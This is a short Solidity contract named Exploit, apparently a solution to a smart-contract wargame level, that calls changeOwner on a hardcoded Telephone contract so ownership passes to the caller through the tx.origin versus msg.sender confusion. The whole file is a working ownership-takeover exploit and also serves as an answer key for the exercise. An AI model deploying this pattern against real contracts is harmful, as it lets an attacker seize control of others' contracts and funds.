// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Exploit {
    address public owner;
    address TelephoneAddress = 0x028bAFfa31d4432940EeE945Fb0334a93fE99127;
    Telephone telephone = Telephone(TelephoneAddress);

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
